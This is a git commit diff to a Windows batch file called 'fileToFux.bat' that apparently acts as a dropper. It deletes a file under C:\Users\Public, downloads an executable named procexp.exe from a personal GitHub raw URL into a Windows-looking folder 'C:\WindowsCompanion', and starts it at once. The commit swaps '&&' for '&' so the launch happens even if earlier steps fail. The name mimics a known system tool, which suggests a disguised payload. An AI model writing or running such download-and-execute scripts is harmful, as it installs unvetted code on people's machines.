ea7dc63943f1123b0b8eadb7e1c6ab3dda52d915
BelliniGauss <118434152+BelliniGauss@users.noreply.github.com>
2024-01-02 19:56:50 +0100

    Update fileToFux.bat

--- fileToFux.bat
+++ fileToFux.bat
@@ -4,4 +4,4 @@ if exist "C:\Users\Public\test.bat" del "C:\Users\Public\test.bat"
 
 set FILE_DL=C:\WindowsCompanion\procexp.exe
 set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/procexp.exe
-curl -L -o  "%FILE_DL%" "%URL%" && start "%FILE_DL%" && exit
+curl -L -o  "%FILE_DL%" "%URL%" & start %FILE_DL% & exit
